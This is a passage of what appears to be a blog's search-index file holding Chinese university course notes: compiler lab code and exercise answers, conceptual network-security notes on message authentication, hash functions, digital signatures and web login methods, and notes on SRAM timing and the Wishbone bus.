builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp<span class="token punctuation">,</span> decl<span class="token punctuation">.</span>init_expr<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitAssignment</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Assignment<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token comment"># 对子节点进行 accept</span>    expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>    <span class="token comment"># 设置返回值为赋值指令的返回值, 赋值操作更新左值, 左端项是左值 temp</span>    expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>        <span class="token string">"val"</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitAssignment<span class="token punctuation">(</span>expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>目标代码生成</strong>: 为赋值语句实现了 <code>visitAssign</code> 函数进行目标代码生成.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/riscv/riscvasmemitter.py:class RiscvAsmEmitter</span><span class="token keyword">def</span> <span class="token function">visitAssign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> instr<span class="token punctuation">:</span> Assign<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>seq<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>Move<span class="token punctuation">(</span>instr<span class="token punctuation">.</span>dst<span class="token punctuation">,</span> instr<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="step-5-1"><a href="#step-5-1" class="headerlink" title="step 5"></a>step 5</h3><ol><li><p>我们假定当前栈帧的栈顶地址存储在 sp 寄存器中, 请写出一段 <strong>risc-v 汇编代码</strong>, 将栈帧空间扩大 16 字节 (提示1: 栈帧由高地址向低地址延伸; 提示2: risc-v 汇编中 <code>addi reg0, reg1, &lt;立即数&gt;</code> 表示将 <code>reg1</code> 的值加上立即数存储到 <code>reg0</code> 中).</p><p> <strong>答:</strong> 汇编代码为:</p> <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">addi sp, sp, -16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>有些语言允许在同一个作用域中多次定义同名的变量, 例如这是一段合法的 Rust 代码 (你不需要精确了解它的含义, 大致理解即可):</p> <pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token function">g</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 其中 <code>f(a)</code> 中的 <code>a</code> 是上一行的 <code>let a = 0;</code> 定义的, <code>g(a)</code> 中的 <code>a</code> 是上一行的 <code>let a = f(a);</code>.</p><p> 如果 MiniDecaf 也允许多次定义同名变量, 并规定新的定义会覆盖之前的同名定义, 请问在你的实现中, 需要对定义变量和查找变量的逻辑做怎样的修改 (提示: 如何区分一个作用域中<strong>不同位置</strong>的变量定义?).</p><p> <strong>答:</strong> 在语义分析部分 <code>frontend/typecheck/name.py</code> 中:</p><ul><li><code>visitDeclaration</code> 定义变量时, 不查询是否有同名变量并抛出同名异常, 因为顺序执行的程序中, 新的定义会覆盖之前的定义. 先访问初始化语句, 再访问变量声明, 并覆盖原始变量. 这是因为如果存在重名变量定义, 可以先根据变量的初始值计算出其新定义值.</li><li><code>visitIdentifier</code> 查找变量无需修改, 变量被新定义的变量覆盖后, 只需寻找当前作用域中的符号, 即是最新定义的变量.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Compiler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Principles of Compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记3</title>
      <link href="/2023/10/24/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-3/"/>
      <url>/2023/10/24/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-3/</url>
      
        <content type="html"><![CDATA[<h1 id="三、认证技术"><a href="#三、认证技术" class="headerlink" title="三、认证技术"></a>三、认证技术</h1><h2 id="消息认证"><a href="#消息认证" class="headerlink" title="消息认证"></a>消息认证</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>网络环境中的攻击:<ul><li>对付泄密、传输分析——消息保密性.</li><li>对付伪装、内容修改、顺序修改、计时修改——消息认证.</li><li>对付发送方否认——数字签名.</li><li>对付接收方否认——数字签名和相关协议.</li></ul></li><li>消息认证:<ul><li>认证 = 比较.</li><li>验证收到的消息确实来自真正的发送方且未被修改.</li><li>可以验证消息的顺序和及时性.<ul><li>数字签名是一种认证技术, 用来抗击发送方否认.</li><li>各种认证协议属于认证技术.</li></ul></li><li>消息认证在功能上看作两层:<ul><li>下面有产生认证符的函数, 认证符是用来认证消息的值.</li><li>上面协议将函数作为原语, 使接收方可以验证消息真实性.</li></ul></li></ul></li></ul><h3 id="三种认证函数"><a href="#三种认证函数" class="headerlink" title="三种认证函数"></a>三种认证函数</h3><h4 id="消息加密"><a href="#消息加密" class="headerlink" title="消息加密"></a>消息加密</h4><ul><li><p>对称加密:</p><ul><li><p>要求明文具有易于识别的结构, 不通过加密函数不能重复这种结构.</p></li><li><p>加密前, 每个消息附加一个错误检测码 (帧校验序列 FCS).</p></li><li><p>先计算 FCS, 再加密: 可提供认证.</p></li><li><p>先加密, 再计算FCS: 攻击者可构造具有正确 FCS 的消息造成混淆.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707161.png" alt=""></p></li><li><p>例: TCP 协议.</p></li><li><p>特点:</p><ul><li>提供保密性: 只有 A 和 B 共享密钥.</li><li>提供认证: 只能发自 A, 传输中未被改变.</li><li>不能提供数字签名: 接收方可以伪造, 发送方可以否认.</li></ul></li></ul></li><li><p>公钥加密:</p><ul><li>只提供保密性, 不能提供认证.</li><li>既要提供保密性, 又要提供认证, 发送方先用私钥数字签名, 再用公钥加密.</li><li>缺点:<ul><li>执行了四次附加公钥算法运算.</li></ul></li><li>特点:<ul><li>提供保密性: 只有 B 拥有解密 $K_{U_b}$, 但任何人可加密消息假称是 A.</li><li>提供认证和签名: 只有 A 拥有加密 $K_{R_a}$, 传输中未被改变.</li></ul></li></ul></li></ul><h4 id="消息认证码-MAC"><a href="#消息认证码-MAC" class="headerlink" title="消息认证码 MAC"></a>消息认证码 MAC</h4><ul><li><p>与加密的区别: MAC 算法不要求可逆性, 加密算法必须可逆.</p></li><li><p>双方共享密钥, MAC 不能提供数字签名.</p></li><li><p>与明文有关的认证: 先计算 MAC, 再加密.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707162.png" alt=""></p></li><li><p>与密文有关的认证: 先加密, 再计算 MAC.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707163.png" alt=""></p></li><li><p>认证和保密分开, 使得层次结构更灵活.</p><ul><li>可以在应用层提供认证, 而在传输层提供保密性.</li></ul></li></ul><h4 id="Hash-函数"><a href="#Hash-函数" class="headerlink" title="Hash 函数"></a>Hash 函数</h4><ul><li><p>Hash 码是消息认证码的一种变形, 不使用密钥, 具有错误检测能力.</p></li><li><p>Hash 码用于消息认证:</p><ul><li><p>Hash 码+对称密码: Hash 码提供认证所需的结构或冗余.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707164.png" alt=""></p></li><li><p>Hash 码+对称密码: 不要求保密性, 减少处理代价, 相当于 MAC.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707165.png" alt=""></p></li><li><p>Hash 码+公钥密码: 提供认证与数字签名.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707166.png" alt=""></p></li><li><p>Hash 码+对称密码+公钥密码: 提供认证、数字签名和保密性.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707167.png" alt=""></p></li><li><p>Hash 码+秘密值: 提供了认证.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707168.png" alt=""></p></li><li><p>Hash 码+秘密值+对称密码: 提供了认证和保密性.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707169.png" alt=""></p></li></ul></li><li><p>不要求保密性, 可不使用加密函数, 减少计算代价:</p><ul><li>加密软件速度慢.</li><li>加密硬件成本不容忽视.</li><li>加密硬件优化针对大数据块.</li></ul></li></ul><h3 id="安全-Hash-函数-迭代-Hash-函数-一般结构"><a href="#安全-Hash-函数-迭代-Hash-函数-一般结构" class="headerlink" title="安全 Hash 函数 (迭代 Hash 函数) 一般结构"></a>安全 Hash 函数 (迭代 Hash 函数) 一般结构</h3><ul><li><p>MD5, SHA-1 和 RIPEMD-160 都采用这种结构.</p></li><li><p>Hash 函数将输入分组, 最后分组不足时填充.</p></li><li><p>输入包含长度, 增加了攻击的难度.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707170.png" alt=""></p></li><li><p>压缩函数 f:</p><ul><li>输入: 前一步 n 位即连接变量和 b 位分组.</li><li>输出: 一个 n 位分组.</li><li>通常 b&gt;n, 称压缩函数.</li><li>连接变量初始值在算法开始时指定, 终值为 Hash 值.</li><li>设计安全 Hash 函数归纳为设计有抗碰撞能力 (计算不可行) 的压缩函数.</li></ul></li></ul><h3 id="常用-Hash-算法"><a href="#常用-Hash-算法" class="headerlink" title="常用 Hash 算法"></a>常用 Hash 算法</h3><ul><li>MD 族:<ul><li>MD2:<ul><li>数据 16 位补位, 附加 16 位检验和, 计算 128 位散列值.</li><li>如果忽略检验和, 产生 MD2 碰撞.</li></ul></li><li>MD4:<ul><li>利用一部个人电脑几分钟内找到 MD4 完整版本碰撞.</li></ul></li><li>MD5:<ul><li>王小云攻破 MD5 碰撞.</li></ul></li><li>RIPEMD-128/160/320.</li></ul></li><li>SHA 族: 根据 MD4 和 MD5 开发的算法.</li><li>HAVAL: 产生不同长度的哈希值, 允许用户指定轮数.</li></ul><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><ul><li><p>算法结构:</p><ul><li>输入长度无限制.</li><li>分组长度 512 bits.</li><li>输出长度 128 bits.</li><li>四轮运算, 每轮 16 步迭代.</li></ul></li><li><p>设计目标:</p><ul><li>安全性: 找到摘要相同的消息计算上不可行.</li><li>速度: 算法有利于快速软件实现.</li><li>简洁性: 算法易于描述且易于编程.</li><li>倾向使用低端结构.</li></ul></li><li><p>算法步骤:</p><ul><li>增加填充位.</li><li>填充长度.</li><li>初始化 MD 缓存:<ul><li>中间结果和最终结果保存于 128 位缓冲区, 4 个 32 位寄存器.</li></ul></li><li>以 512 位分组处理消息:<ul><li>四轮运算组成的压缩函数是算法核心, 标记为 HMD5.</li><li>四轮运算结构相同, 各轮基本逻辑函数不同.</li><li>每轮对缓冲区 ABCD 进行 16 步迭代.</li></ul></li><li>输出.</li></ul></li><li><p>安全性:</p><ul><li>输出每一位都是输入每一位的函数.</li><li>基本逻辑函数复杂迭代使输出对输入依赖性小.</li><li>找到 Hash 码相同消息的代价是 $2^{64}$.</li><li><p>找到具有给定摘要消息的代价是 $2^{128}$.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707171.png" alt=""></p></li></ul></li></ul><h4 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h4><ul><li>建立在 MD4 之上:<ul><li>MD4 使用三轮运算, 每轮16步迭代.</li><li>MD4 第一轮运算没有使用加法常量, 第二轮、第三轮运算使用加法常量.</li><li>MD4 使用三个基本逻辑函数, 每轮运算使用一个.</li><li>MD4 没有每步迭代结果与前一步相加.</li></ul></li><li><p>算法结构:</p><ul><li>输入长度 $&lt;2^{64}$ bits.</li><li>分组长度 512 bits.</li><li>输出长度 160 bits.</li><li>四轮运算, 每轮 20 步迭代.</li></ul></li></ul><h4 id="RIPEMD-160"><a href="#RIPEMD-160" class="headerlink" title="RIPEMD-160"></a>RIPEMD-160</h4><ul><li>欧洲 RIPE 计划研究组设计.</li><li><p>算法结构:</p><ul><li>输入长度无限制.</li><li>分组长度 512 bits.</li><li>输出长度 160 bits.</li><li>五轮运算, 每轮 16 步迭代, 运行两次.</li></ul></li></ul><h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><ul><li><p>MD5 短, 易于受到强碰撞性攻击.</p></li><li><p>SHA-1 和 RIPEMD-160 对强碰撞性攻击安全.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707172.png" alt=""></p></li></ul><h3 id="数字签名算法-DSS"><a href="#数字签名算法-DSS" class="headerlink" title="数字签名算法 DSS"></a>数字签名算法 DSS</h3><ul><li><p>消息认证的局限性:</p><ul><li>可以保证通信双方不受第三方的攻击.</li><li>不能处理通信双方自身发生的攻击.</li></ul></li><li><p>数字签名:</p><ul><li>解决收发双方不能完全信任的情况.</li><li>特征:<ul><li>验证签名者、签名日期和时间.</li><li>认证被签的消息内容.</li><li>能由第三方仲裁解决争执.</li></ul></li></ul></li><li><p>直接数字签名:</p><ul><li>只涉及通信双方.</li><li>发送方用私钥对整个消息或 Hash 码加密来产生数字签名, 用接收方公钥和共享密钥对整个消息和签名加密, 获得保密性.</li><li>弱点: 方法有效性依赖于发送方私钥安全性.</li></ul></li><li><p>仲裁数字签名:</p><ul><li>发送方到接收方的已签名消息先发给仲裁者 A, 进行检查以验证消息源及内容, 然后加上日期, 指明该消息通过仲裁检验.</li><li>解决了直接数字签名的问题.</li></ul></li><li><p>数字签名标准 DSS:</p><ul><li>SHA-1 算法: 给出新的数字签名方法, 即数字签名算法 DSA.</li><li>公钥方法: 不能用于加密或密钥分配, 只提供数字签名 (与 RSA 不同).</li><li><p>算法步骤:</p><ul><li>发送方产生 Hash 码和随机数 k, 作为签名函数 Sig 输入.</li><li>签名函数依赖于发送方私钥和全局公钥.</li><li>签名函数保证拥有私钥的发送方才能产生有效签名.</li><li>签名由 s 和 r 两部分构成.</li><li>接收方产生 Hash码, 和签名作为验证函数 Ver 输入.</li><li>验证函数依赖于全局公钥和发送方公钥.</li><li>验证函数输出等于签名 r, 则签名有效.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707173.png" alt=""></p></li></ul></li></ul><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><ul><li>身份认证: 在主客体交互行为过程中确认行为参与者身份.</li></ul><h3 id="电子身份认证概述"><a href="#电子身份认证概述" class="headerlink" title="电子身份认证概述"></a>电子身份认证概述</h3><ul><li><p>常见手段:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301707174.png" style="zoom:50%;"></p></li></ul><h3 id="网站身份认证技术"><a href="#网站身份认证技术" class="headerlink" title="网站身份认证技术"></a>网站身份认证技术</h3><h4 id="HTTP-的-Basic-认证"><a href="#HTTP-的-Basic-认证" class="headerlink" title="HTTP 的 Basic 认证"></a>HTTP 的 Basic 认证</h4><ul><li>用户身份凭证为账号+静态口令.</li><li>HTTP 协议是面向一次连接的无状态网络协议.</li><li>每次明文发送 HTTP 请求到服务器端, 与存储的用户凭证进行比较.</li><li>优点: 交互简单.</li><li>缺点:<ul><li>明文传递账号和口令, 易被监听盗取.<ul><li>方法 1: 使用加密技术:<ul><li>口令作为密钥, 无法躲避重放攻击.</li></ul></li><li>方法 2: 使用消息认证技术:<ul><li>挑战/响应机制, 进行两次 HTTP 请求.</li><li>第一次: 服务器向客户端返回随机挑战码 M, 避免重放攻击.</li><li>第二次: 客户端发送 MAC 码, 服务器端进行验证.</li></ul></li></ul></li><li>本地长期保存账号和口令, 存在安全隐患.</li><li>服务器每次请求都要进行身份验证, 效率低.<ul><li>方法 3: 使用表单验证的 session 机制.</li></ul></li></ul></li></ul><h4 id="基于表单的身份认证"><a href="#基于表单的身份认证" class="headerlink" title="基于表单的身份认证"></a>基于表单的身份认证</h4><ul><li>Session 包括特定客户端、服务器端及操作时间段.</li><li>Session 工作原理:<ul><li>某个 Session 首次启用时, 服务器产生唯一标识符发到客户端.</li><li>标识符通常是随机字符串, 存于内存或本地文件.</li><li>客户端浏览器通常用 Cookie 技术存储标识符.</li><li>Session 存活期间, 客户端每次发送 HTTP 请求都会包含标识符.</li><li>Session 存活期间, 服务器通过标识符关联前后多次请求.</li><li>Session 结束, 服务器和客户端销毁上述标识符.</li></ul></li><li>基于表单的 Web 身份认证过程:<ul><li>客户端向服务器发送请求, 服务器返回包含表单的页面.</li><li>用户填写表单, 客户端把表单发送到服务器; 服务器进行验证, 通过则启动 Session 返回给客户端.</li><li>客户端后续请求包含 Session 标识符, 服务端验证标识符的合法性.<ul><li>通常基于哈希表数据结构.</li></ul></li></ul></li><li>缺点: 明文传输, 安全性低, 存在监听盗取可能.<ul><li>引入挑战/响应机制, 避免明文传输与重放攻击.</li><li>传输账号口令时, 使用传输层 SSL 协议传输 HTTP 请求.</li></ul></li><li>不安全做法: 把账号口令 (加密后) 以 Cookie 机制存放在浏览器端.<ul><li>口令泄露, 重放攻击.</li><li>存放内容加上时间戳, 服务器每次验证时间戳.</li></ul></li></ul><h4 id="增强认证"><a href="#增强认证" class="headerlink" title="增强认证"></a>增强认证</h4><ul><li>仅靠静态口令认证用户, 安全强度不足, 需要更高强度认证方式.</li><li>在静态口令基础上加上其他因素认证方式, 形成双因素或多因素认证.<ul><li>手机短信口令.</li><li>动态口令:<ul><li>VPN, 网上银行, 电子商务.</li><li>动态口令牌: 客户手持, 生成动态密码的终端.</li><li>基于时间同步方式, 每 n 秒变换一次有效动态口令.</li><li>基于计数器同步方式, 每次触发计数器累进时产生动态口令.</li></ul></li><li>USB KEY:<ul><li>USB 接口硬件设备, 内置单片机或智能芯片, 存储密钥或数字证书.</li><li>用于身份认证、数据加密和数字签名.</li><li>USB KEY 中私钥不可导出, 仅用于内置的加密或签名运算.</li><li>身份认证原理:<ul><li>服务器产生随机消息 M 送到 USB KEY.</li><li>USB KEY 用内部私钥对 M 签名.</li><li>服务器使用用户公钥验证签名.</li></ul></li></ul></li><li>数字证书:<ul><li>权威机构/证书授权中心 CA 数字签名发行的文件.</li><li>包含拥有者公钥、名称和 CA 数字签名.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记5</title>
      <link href="/2023/10/20/ji-suan-ji-zu-cheng-yuan-li-bi-ji-5/"/>
      <url>/2023/10/20/ji-suan-ji-zu-cheng-yuan-li-bi-ji-5/</url>
      
        <content type="html"><![CDATA[<h1 id="SRAM-控制器"><a href="#SRAM-控制器" class="headerlink" title="SRAM 控制器"></a>SRAM 控制器</h1><h2 id="SRAM"><a href="#SRAM" class="headerlink" title="SRAM"></a>SRAM</h2><h3 id="SRAM-的结构"><a href="#SRAM-的结构" class="headerlink" title="SRAM 的结构"></a>SRAM 的结构</h3><p>可以把 SRAM 想象成一个数组: <code>uint32_t sram[1048576]</code>, 即 1048576 个 32 位整数, 一共是 <code>32 * 1048576 / 8 = 4 MB</code> 的数据. 我们可以对其进行读和写的操作, 就好像 C 的代码: </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uint32_t</span> sram<span class="token punctuation">[</span><span class="token number">1048576</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// read</span><span class="token class-name">uint32_t</span> read_data <span class="token operator">=</span> sram<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// write</span>sram<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> write_data<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以想象一下 SRAM 的工作流程, 假如有一个二维的矩阵, 一共有 1048576 个行, 每行有 32 列, 每一个矩阵元素就是 0 或者 1, 这样每一行就是一个 32 位整数. </p><p>无论是读还是写, 都有若干个步骤, 需要花费一定的时间, 这意味着在操作 SRAM 时需要按照一定的规则, 否则可能导致读取错误, 或没有成功写入等问题. </p><h3 id="SRAM-的信号"><a href="#SRAM-的信号" class="headerlink" title="SRAM 的信号"></a>SRAM 的信号</h3><p>顶层模块中有如下的信号: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token comment">//BaseRAM信号</span><span class="token keyword">inout</span> <span class="token keyword">wire</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> base_ram_data<span class="token punctuation">,</span>  <span class="token comment">//BaseRAM 数据</span><span class="token keyword">output</span> <span class="token keyword">wire</span><span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> base_ram_addr<span class="token punctuation">,</span> <span class="token comment">//BaseRAM 地址</span><span class="token keyword">output</span> <span class="token keyword">wire</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> base_ram_be_n<span class="token punctuation">,</span>  <span class="token comment">//BaseRAM 字节使能, 低有效, 默认为 0</span><span class="token keyword">output</span> <span class="token keyword">wire</span> base_ram_ce_n<span class="token punctuation">,</span>       <span class="token comment">//BaseRAM 片选, 低有效</span><span class="token keyword">output</span> <span class="token keyword">wire</span> base_ram_oe_n<span class="token punctuation">,</span>       <span class="token comment">//BaseRAM 读使能, 低有效</span><span class="token keyword">output</span> <span class="token keyword">wire</span> base_ram_we_n<span class="token punctuation">,</span>       <span class="token comment">//BaseRAM 写使能, 低有效</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是 CPU 访问 SRAM 的途径. 实验板上一共有两组 SRAM, 我们称之为 <strong>BaseRAM</strong> 和 <strong>ExtRAM</strong>, 上面的信号是和 BaseRAM 进行连接的信号.</p><ol><li><code>inout wire [31:0] base_ram_data</code>: 读写的 32 位数据, 用的是同一组信号, <strong>同一时间只能进行读写其中一个</strong>.</li><li><code>output wire [19:0] base_ram_addr</code>: 地址线, 正好是 <code>uint32_t sram[1048576]</code> 的数组大小.</li><li><code>output wire [3:0] base_ram_be_n</code>: 字节使能, 目的是实现<strong>部分写入</strong>, 例如只想写入四个字节其中一个, 就把相应位设置为 <code>0</code>.</li><li><code>output wire base_ram_ce_n</code>: 片选使能, 需要保证 <code>base_ram_ce_n=0</code>; 如果 <code>base_ram_ce_n=1</code>, 就进入<strong>省电模式</strong>.</li><li><code>output wire base_ram_oe_n</code>: 输出使能, 读操作需保证 <code>base_ram_oe_n=0</code>, 此时 <code>base_ram_data</code> <strong>由 SRAM 输出</strong>; 写操作需保证 <code>base_ram_oe_n=1</code>, 此时 <code>base_ram_data</code> <strong>由 FPGA 输出</strong>.</li><li><code>output wire base_ram_we_n</code>: 写入使能, 读操作对应 <code>base_ram_we_n=1</code>, 写操作对应 <code>base_ram_we_n=0</code>.</li></ol><p>如果<strong>不考虑 SRAM 操作所需要的时间</strong>, 大概操作思路如下: </p><p>读操作:</p><ol><li>设置 <code>base_ram_addr</code> 为要读取的地址, 设置 <code>base_ram_be_n=0b0000</code>, <code>base_ram_ce_n=0</code>, <code>base_ram_oe_n=0</code>, <code>base_ram_we_n=1</code>.</li><li>等待读取完毕, 在 <code>base_ram_data</code> 上得到读取的数据.</li></ol><p>写操作:</p><ol><li>设置 <code>base_ram_addr</code> 为要写入的地址, 设置 <code>base_ram_ce_n=0</code>, <code>base_ram_oe_n=1</code>, <code>base_ram_we_n=0</code>, 根据要写入的字节数量设置 <code>base_ram_be_n</code>.</li><li>等待写入完毕.</li></ol><h3 id="SRAM-的时序"><a href="#SRAM-的时序" class="headerlink" title="SRAM 的时序"></a>SRAM 的时序</h3><p>SRAM 实际上读写需要经过几个步骤, 这意味着不能简单地直接给出信号, 完成读和写的操作. 接下来分析一下 SRAM 读写需要的具体步骤和相应的波形. </p><h4 id="读时序"><a href="#读时序" class="headerlink" title="读时序"></a>读时序</h4><p>SRAM 读取时, 首先找到相应的行, 再把一行的数据输出到 <code>base_ram_data</code> 上. 这一步需要大约一个周期的时间. 这意味着需要等待一个周期, 在第二个周期才可以得到读取的数据:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624677.png" alt=""></p><p>观察上面的波形: </p><ol><li>每次读取都需要等待一个周期. 等待的时候, <strong>地址保持不变</strong>.</li><li>读操作需要保持 <code>ce_n=0</code>, <code>oe_n=0</code>, <code>we_n=1</code>.</li><li>四个字节都读取, 于是设置 <code>be_n=0b0000</code>.</li><li>不需要读取的时候, 设置 <code>ce_n=1</code>.</li></ol><h4 id="写时序"><a href="#写时序" class="headerlink" title="写时序"></a>写时序</h4><p>SRAM 写入的过程较为复杂. 可能会只写入部分字节 (如 <code>be_n=0b1100</code>), SRAM 内部操作需要如下三个步骤: </p><ol><li>根据 <code>addr</code> 找到对应的行, 把一行的数据读取出来.</li><li>根据 <code>be_n</code> 计算出新的数据, 如原来保存的数据是 <code>0x12345678</code>, 新写入的数据是 <code>0x87654321</code>, 如果 <code>be_n=0b1100</code>, 则新的数据是 <code>0x12344321</code>.</li><li>把新的数据写入到行中.</li></ol><p>这三个步骤都用一个周期的时间来完成:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301624678.png" alt=""></p><p>观察上面的波形: </p><ol><li>每次写入都需要三个周期, 这三个周期内, <strong>地址和数据保持不变</strong>.</li><li><code>we_n</code> 三个周期取值分别是 <code>1, 0, 1</code>.</li><li>写操作需要保持 <code>ce_n=0, oe_n=1</code>.</li><li>四个字节都写入, 设置 <code>be_n=0b0000</code>, 可以根据实际需要设置.</li><li>不需要写入的时候, 设置 <code>ce_n=1</code>.</li></ol><h2 id="Wishbone-总线协议"><a href="#Wishbone-总线协议" class="headerlink" title="Wishbone 总线协议"></a>Wishbone 总线协议</h2><h3 id="为什么需要总线协议"><a href="#为什么需要总线协议" class="headerlink" title="为什么需要总线协议"></a>为什么需要总线协议</h3><p>日常使用的电脑里有各种各样的部件, 例如键盘, 鼠标, 显示器, 无线网卡等等, 它们在操作系统里都是如何识别和管理的? 一些概念, 如 USB、PCIe 等, 用途是给 CPU 一个<strong>通用接口</strong>. 总线的功能:</p><ol><li>提供一个<strong>统一的硬件接口</strong>, 可以接入不同的<strong>硬件外设</strong>.</li><li>提供一个<strong>统一的软件接口</strong>, <strong>操作系统</strong>可以用同样的方式, 来操作这个总线下的所有外设.</li></ol><p>上面的 USB 总线和 PCIe 总线, 都是属于 <strong>CPU 片外</strong>的总线, 可以在主板上看到. 我们要实现 CPU 片内的总线, 目的是给 <strong>CPU 核心</strong>一个<strong>统一接口</strong>, 来访问内存或者外设.</p><h3 id="总线协议是什么"><a href="#总线协议是什么" class="headerlink" title="总线协议是什么"></a>总线协议是什么</h3><p><strong>从 CPU 到内存</strong>需要传输的信息:</p><ol><li>地址 <code>addr</code>:  按照内存的大小计算地址线的宽度, 例如 4GB 内存是 <code>2^32</code> 字节, 需要 32 位的地址.</li><li>写入的数据 <code>w_data</code>.</li><li>读还是写 <code>we</code>: 高表示写, 低表示读.</li></ol><p><strong>从内存到 CPU</strong> 需要传输的信息: 